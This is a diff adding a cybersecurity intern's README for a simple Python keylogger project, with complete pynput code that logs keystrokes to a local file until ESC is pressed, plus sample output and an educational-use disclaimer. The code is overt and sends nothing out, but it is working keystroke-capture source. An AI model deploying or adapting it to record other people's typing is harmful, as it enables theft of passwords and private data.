@@ -1,0 +1,82 @@
+
+
+
+__PROJECT TITTLE__
+
+SIMPLE KEY LOGGER(#Educational purpose🔐)
+
+#PROJECT OVERVIEW
+
+A keylogger is a program that records the keys pressed on a keyboard. In cybersecurity, keyloggers are often studied to understand how attackers 
+capture sensitive information such as usernames, passwords, and other confidential data.
+This project implements a basic keylogger that monitors keyboard activity and saves the recorded keystrokes into a text file for analysis.
+
+#FEATURES
+
+**Captures keyboard input in real time
+**Records both normal and special keys
+**Saves captured keystrokes into a log file
+**Stops logging when the ESC key is pressed
+**Demonstrates how keystroke logging works for cybersecurity research
+
+#TECHNOLOGIES USED
+
+**Python
+**pynput library for keyboard event monitoring
+
+#HOW THE PROGRAM WORKS??
+
+**The program starts a keyboard listener using the pynput library.
+**Each key pressed by the user is captured by the program.
+**The captured keystrokes are written into a log file.
+**Special keys such as space, enter, or shift are recorded with their key names.
+**The program stops logging when the ESC key is pressed.
+
+Below are the full details of the project, including the complete Python code implementation and a sample output
+demonstrating the functionality of the **KEYLOGGER** 
+**______________________________________________________________________________________________________________________**
+from pynput import keyboard
+
+log_file = "keylog.txt"
+
+def on_press(key):
+    try:
+        with open(log_file, "a") as file:
+            file.write(key.char)
+    except AttributeError:
+        with open(log_file, "a") as file:
+            file.write(f"[{key}]")
+
+def on_release(key):
+    if key == keyboard.Key.esc:
+        return False
+
+print("Keylogger started... Press ESC to stop.")
+
+with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
+    listener.join()
+
+
+    print("Keylogger stopped")
+**__________________________________________________________________________________________________________________________**
+
+#EXAMPLE OUTPUT
+
+After running the program and typing on the keyboard, the keylog.txt file may contain logs like this:
+{hello[Key.space]world[Key.enter]}
+
+#LEARNING OUTCOME
+
+Through this project, I learned how keyboard event monitoring works and how keystrokes can be captured and stored using Python. 
+This project helped me understand how keylogging techniques operate and how such logs can be analyzed in cybersecurity research 
+and security monitoring.
+
+***IMPORTANT NOTE.
+
+This project is developed strictly for educational purposes to understand how keyloggers work in cybersecurity research. 
+It should not be used for unauthorized monitoring or malicious activities.
+
+
+AUTHOR.
+Santosh Kanikelli
+Cyber Security Intern – Prodigy InfoTech
